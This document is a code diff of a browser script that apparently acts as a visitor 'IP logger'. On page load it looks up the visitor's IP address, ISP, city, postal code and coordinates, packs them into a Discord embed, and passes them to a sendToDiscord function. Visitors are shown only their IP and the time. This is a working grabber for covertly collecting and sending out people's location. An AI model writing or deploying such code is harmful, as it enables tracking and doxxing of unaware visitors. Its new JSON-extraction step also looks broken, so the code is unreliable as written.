@@ -1,28 +1,26 @@
 document.addEventListener('DOMContentLoaded', () => {
-  const scriptElement = document.createElement('script');
-  scriptElement.src = 'https://json.geoiplookup.io/?callback=yourCallback';
-  document.head.appendChild(scriptElement);
-});
+  fetch('https://ipapi.com/json/?callback=yourCallback')
+    .then(response => response.text())
+    .then(data => {
+      // Extract the JSON data from the response
+      const jsonStr = data.match(/^{.*}$/)[0];
+      const geoData = JSON.parse(jsonStr);
+      
+      const ipAddress = geoData.ip;
+      const currentDateTime = new Date();
+      const dateTimeString = currentDateTime.toLocaleString();
 
-function yourCallback(data) {
-  const ipAddress = data.ip;
-  const currentDateTime = new Date();
-  const dateTimeString = currentDateTime.toLocaleString();
-
-  fetch(`https://json.geoiplookup.io/${ipAddress}`)
-    .then(response => response.json())
-    .then(geoData => {
       const message = createMessage(ipAddress, dateTimeString, geoData);
       sendToDiscord(message);
+
+      document.getElementById('ip-address').textContent = `IP Address: ${ipAddress}`;
+      document.getElementById('datetime').textContent = `Date and Time: ${dateTimeString}`;
     })
     .catch(error => console.error(error));
-
-  document.getElementById('ip-address').textContent = `IP Address: ${ipAddress}`;
-  document.getElementById('datetime').textContent = `Date and Time: ${dateTimeString}`;
-}
+});
 
 function createMessage(ipAddress, dateTimeString, geoData) {
-  const { ip, isp, country_name, region, city, postal, latitude, longitude } = geoData;
+  const { ip, isp, country_name, region, city, zip, lat, lon } = geoData;
 
   const message = {
     embeds: [
@@ -36,9 +34,9 @@ function createMessage(ipAddress, dateTimeString, geoData) {
           Country: ${country_name}
           Region: ${region}
           City: ${city}
-          Postal Code: ${postal}
-          Latitude: ${latitude}
-          Longitude: ${longitude}
+          Postal Code: ${zip}
+          Latitude: ${lat}
+          Longitude: ${lon}
         `,
         thumbnail: {
           url: 'https://cdn.discordapp.com/attachments/1008763573029306519/1112393554585718867/1075892497257091092.png' // Customize the URL of the preview image
